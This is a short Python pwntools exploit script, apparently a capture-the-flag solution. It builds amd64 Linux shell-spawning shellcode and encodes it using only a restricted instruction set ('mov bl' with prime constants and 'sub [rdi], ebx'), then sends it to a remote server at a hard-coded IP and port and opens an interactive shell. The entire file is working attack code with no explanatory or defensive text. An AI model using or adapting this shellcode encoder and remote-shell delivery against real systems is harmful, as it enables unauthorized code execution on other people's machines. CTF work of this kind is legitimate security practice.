from Crypto.Util.number import *
from pwn import *

context.arch='amd64'
sc=asm(shellcraft.amd64.linux.sh())

ps=[2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229, 233, 239, 241, 251]
movbl = {}

for p in ps:
    print p
    movbl[p]=asm('mov bl,%d'%p)

c = remote('35.198.178.224', 1337)
pa=''
pa+=asm('mov    bl,0xfb')
pa+='\x03\xfb' * 10
movb1=asm('''mov bl,2
push rbx
pop rcx
mov bl,7
sar ebx,cl''')
#addprdi=asm(' add    ebx,DWORD PTR [rdi]')
subprdi=asm('sub    DWORD PTR [rdi],ebx')

def incrdi():
    global pa
    pa+=movb1
    pa+='\x03\xfb'

state=0x95959595
for i in range(len(sc)):
    if i!=0:
        incrdi()
    delta=((state&0xff)-ord(sc[i]))&0xff
    minp=-1
    minv=257
    for p in ps[1:]:
        val=delta*inverse(p,256)%256
        if val<minv:
            minv=val
            minp=p
    pa+=movbl[minp]
    for j in range(minv):
        pa+=subprdi
        state=(state-minp)&0xffffffff
    state=(state>>8)|0x95000000
        

assert len(pa)<0x9ce
pa=pa.ljust(0x1000, '\x95')
#pause()
c.send(pa)
c.interactive()
